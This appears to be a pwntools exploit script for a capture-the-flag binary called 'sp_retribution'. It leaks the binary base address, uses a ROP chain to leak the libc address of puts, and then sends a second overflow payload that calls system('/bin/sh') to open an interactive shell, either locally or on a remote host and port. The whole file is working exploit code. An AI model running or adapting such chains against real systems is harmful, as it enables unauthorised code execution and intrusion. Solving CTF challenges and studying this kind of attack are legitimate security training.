#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './sp_retribution' 
elf = context.binary = ELF(fname, checksec=False)
libc = elf.libc
os.system('clear')

if len(sys.argv) < 2:
  print('Running solver locally..\n')
  r    = process(fname)
  # r = gdb.debug(fname, gdbscript='break main\ncontinue')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Send shellcode
r.sendlineafter(b'>>', b'2')
r.sendlineafter(b'y = ', b'A'*7) # note that the ending '\n' is also passed to read()
rev_data = r.recvuntil(b'(y/n): ').split(b'\n')
binary_base_raw = rev_data[-2]
binary_base = u32(binary_base_raw[2:]) << 16
elf.address = binary_base
success(f'Binary base @ {hex(elf.address)}\n')
rop = ROP(elf)

payload = b'\x90' * 88
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.missile_launcher)

r.sendline(payload)
r.recvlines(2)
libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
success(f'Libc base @ {hex(libc.address)}\n')

sc = b'\x90' * 88
sc += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
sc += p64(next(libc.search(b'/bin/sh'))) # /bin/bash
sc += p64(libc.symbols.system)
r.sendlineafter(b'y = ', b'')
r.sendlineafter(b'(y/n): ', sc)

pause(1)
r.interactive()
